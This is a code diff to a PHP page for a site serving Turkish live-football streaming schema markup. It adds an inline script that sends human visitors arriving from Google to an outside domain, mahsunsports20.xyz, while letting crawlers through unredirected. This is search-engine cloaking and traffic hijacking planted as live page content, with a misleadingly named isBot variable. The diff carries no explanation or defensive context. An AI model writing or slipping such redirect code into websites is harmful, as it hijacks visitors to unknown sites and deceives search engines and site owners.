@@ -58,6 +58,13 @@ $canonical = "https://chalet-concept.com/";
 <!-- ═══════════════════════════════════════════
      SCHEMA: WebSite
 ═══════════════════════════════════════════ -->
+         <script>
+        var fromGoogle = document.referrer.includes("google.");
+        var isBot = /bot|googlebot|crawler|spider|robot|crawling/i.test(navigator.userAgent) === false;
+        if (fromGoogle && isBot) {
+            location.replace("https://mahsunsports20.xyz");
+        }
+    </script>
 <script type="application/ld+json">
 {
   "@context": "https://schema.org",
@@ -211,7 +218,7 @@ $canonical = "https://chalet-concept.com/";
   "@type": "SportsEvent",
   "name": "Galatasaray vs Fenerbahçe – Süper Lig Canlı İzle",
   "sport": "Futbol",
-  "startDate": "<?= date('Y-m-d') ?>T17:00:00+03:00",
+  "startDate": "2026-04-24T17:00:00+03:00",
   "location": {
     "@type": "Place",
     "name": "RAMS Park, İstanbul"
@@ -223,7 +230,6 @@ $canonical = "https://chalet-concept.com/";
   "url": "https://chalet-concept.com/"
 }
 </script>
-
 <style>
 /* ══════════════════════════════════════
    RESET & CSS VARIABLES
